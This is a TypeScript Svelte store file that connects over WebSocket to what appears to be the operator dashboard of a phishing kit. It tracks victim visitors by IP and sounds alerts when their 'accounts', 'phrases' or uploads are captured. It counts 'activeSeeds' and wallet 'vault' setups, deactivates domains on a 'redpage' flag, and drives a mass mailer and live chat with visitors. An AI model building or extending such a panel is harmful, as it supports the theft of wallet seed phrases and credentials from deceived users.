import { writable, get } from 'svelte/store';
import type {
	Visitor,
	LogEntry,
	OverviewStats,
	Flow,
	HostConfig,
	UserAccount,
	CustomDomain,
	InboxAccount,
	ChatMessage,
	ServerEvent,
	ClientEvent
} from '$lib/server/state';
import { playConnect, playDisconnect, playAlert } from './audio';

export const visitors = writable<Visitor[]>([]);
export const activityLog = writable<LogEntry[]>([]);
export const stats = writable<OverviewStats>({
	uptime: '0m',
	uptimeStart: '',
	totalVisitors: 0,
	onlineVisitors: 0,
	totalClients: 0,
	activeClients: 0,
	activityRate: '0.0%',
	last24h: 0,
	lastWeek: 0,
	vaultSetups: 0,
	completedSetups: 0,
	completedPct: 0,
	totalAssets: 0,
	activeSeeds: 0
});
export const flows = writable<Flow[]>([]);
export const hosts = writable<HostConfig[]>([]);
export const users = writable<UserAccount[]>([]);
export const domains = writable<CustomDomain[]>([]);
export const inboxAccounts = writable<InboxAccount[]>([]);
export const chatMessages = writable<ChatMessage[]>([]);
export const selectedVisitorIp = writable<string | null>(null);
export const adminLink = writable<{ on: boolean; domain: string; auth: string } | null>(null);
export const mailerResult = writable<{ sent: number; failed: number; total: number; errors: string[] } | null>(null);
export const connected = writable(false);
export const livechatEvent = writable<{ type: 'msg:new' | 'msg:read'; conversationId: string; visitorIp: string; message?: any } | null>(null);
export const vaultEvent = writable<{ id?: string; ip?: string; deleted?: string } | null>(null);

let ws: WebSocket | null = null;
let reconnectTimer: ReturnType<typeof setTimeout> | null = null;

export function sendMessage(type: ClientEvent['type'], payload: unknown): void {
	if (ws && ws.readyState === WebSocket.OPEN) {
		ws.send(JSON.stringify({ type, payload }));
	}
}

function handleMessage(event: ServerEvent): void {
	switch (event.type) {
		case 'init':
			visitors.set(event.payload.visitors);
			activityLog.set(event.payload.activityLog);
			stats.set(event.payload.stats);
			flows.set(event.payload.flows);
			hosts.set(event.payload.hosts);
			users.set(event.payload.users || []);
			domains.set(event.payload.domains || []);
			inboxAccounts.set(event.payload.inboxAccounts || []);
			break;

		case 'visitor:connected': {
			const visitor = event.payload;
			visitors.update((list) => {
				const idx = list.findIndex((v) => v.ip === visitor.ip);
				if (idx !== -1) {
					list[idx] = visitor;
					return [...list];
				}
				return [visitor, ...list];
			});
			playConnect();
			break;
		}

		case 'visitor:disconnected': {
			const { ip } = event.payload;
			visitors.update((list) =>
				list.map((v) => (v.ip === ip ? { ...v, status: 'offline' as const, lastSeen: 'just now' } : v))
			);
			playDisconnect();
			break;
		}

		case 'visitor:updated': {
			const updated = event.payload;
			visitors.update((list) =>
				list.map((v) => (v.ip === updated.ip ? updated : v))
			);
			if (updated.accounts > 0 || updated.phrases > 0 || updated.uploads > 0) {
				playAlert();
			}
			break;
		}

		case 'stats:updated':
			stats.set(event.payload);
			break;

		case 'log:new':
			activityLog.update((log) => {
				const newLog = [event.payload, ...log];
				return newLog.slice(0, 100);
			});
			break;

		case 'host:redpage': {
			const { domain } = event.payload;
			hosts.update((list) =>
				list.map((h) => (h.domain === domain ? { ...h, active: false } : h))
			);
			playAlert();
			break;
		}

		case 'flows:updated':
			flows.set(event.payload);
			break;

		case 'users:updated':
			users.set(event.payload);
			break;

		case 'domains:updated':
			domains.set(event.payload);
			break;

		case 'inbox:updated':
			inboxAccounts.set(event.payload);
			break;

		case 'visitor:nextpage': {
			const { ip } = event.payload;
			playAlert();
			break;
		}

		case 'visitor:screen:data':
			break;

		case 'chat:new':
			chatMessages.update((msgs) => [...msgs, event.payload]);
			break;

		case 'chat:list':
			chatMessages.set(event.payload);
			break;

		case 'admin:link':
			adminLink.set(event.payload);
			break;

		case 'mailer:result':
			mailerResult.set(event.payload);
			break;

		case 'livechat:msg:new':
			livechatEvent.set({
				type: 'msg:new',
				conversationId: event.payload.conversationId,
				visitorIp: event.payload.visitorIp,
				message: event.payload.message
			});
			break;

		case 'livechat:msg:read':
			livechatEvent.set({
				type: 'msg:read',
				conversationId: event.payload.conversationId,
				visitorIp: event.payload.visitorIp
			});
			break;

		case 'vault:updated':
			vaultEvent.set(event.payload as any);
			break;
	}
}

function attemptReconnect(): void {
	if (reconnectTimer) return;
	reconnectTimer = setTimeout(() => {
		reconnectTimer = null;
		connectWebSocket();
	}, 2000);
}

export function connectWebSocket(): void {
	if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) {
		return;
	}

	const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
	const url = `${protocol}//${window.location.host}/ws`;

	ws = new WebSocket(url);

	ws.onopen = () => {
		connected.set(true);
	};

	ws.onmessage = (event) => {
		try {
			const data: ServerEvent = JSON.parse(event.data);
			handleMessage(data);
		} catch {
			// ignore malformed messages
		}
	};

	ws.onclose = () => {
		connected.set(false);
		ws = null;
		attemptReconnect();
	};

	ws.onerror = () => {
		ws?.close();
	};
}

export function disconnectWebSocket(): void {
	if (reconnectTimer) {
		clearTimeout(reconnectTimer);
		reconnectTimer = null;
	}
	if (ws) {
		ws.close();
		ws = null;
	}
	connected.set(false);
}
